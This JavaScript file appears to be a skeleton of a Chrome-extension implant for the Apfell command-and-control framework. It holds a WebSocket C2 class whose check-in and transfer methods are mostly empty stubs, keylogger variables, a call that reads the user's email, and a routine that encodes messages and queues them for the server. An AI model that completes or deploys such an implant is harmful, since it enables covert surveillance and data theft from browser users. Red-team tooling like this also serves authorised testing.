//--------------IMPLANT INFORMATION-----------------------------------
class implant{
    constructor(){
        this.hostinfo = "chrome";
        this.userinfo = '';
        this.procinfo = 0;
        this.uuid = "XXXX";
        this.apfellid = 0;
    }
}

apfell = new implant();
//--------------Base C2 INFORMATION---------------------------------------
class baseC2 {
    constructor(host, port, endpoint, ssl, interval) {
        this.host = host;
        this.port = port;
        this.proto = '';
        this.interval = interval;
        this.commands = {};

        if (ssl === true) {
            this.proto = 'wss://';
        } else {
            this.proto = 'ws://';
        }
        this.server = `${this.proto}${this.host}:${this.port}/${endpoint}`;
    }

    getInterval(){
        return this.interval;
    }

    getConfig(){
        // return the c2 config
    }

    postResponse(){
        //output a response to a task
    }
    setConfig(){
        //Not implemented
    }
    download(){
        //Not Implemented
    }
    upload(){
        //Not implemented
    }

    checkIn(){
        // register this callback with the server
    }

    sendResponse(){
        // Send a response to the server
    }
}

//-------------SHARED COMMAND CODE ------------------------
let keylogTaskID = 0;
let keyloggers = [];


chrome.identity.getProfileUserInfo(function(info){
    apfell.userinfo = info.email;
});

function sendError(taskid, tasktype, err) {
    let payload = btoa(unescape(encodeURIComponent(JSON.stringify(chrome.runtime.lastError.message))));
    let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, payload.length, taskid, tasktype, payload);
    const meta = {};
    meta.type = 3;
    meta.metadata = envelope;
    const metaenvelope = JSON.stringify(meta);
    out.push(metaenvelope);
}

//------------- C2Profile -------------------------------------------

//-------------COMMAND DECLARATIONS AND IMPLEMENTATIONS -----------------------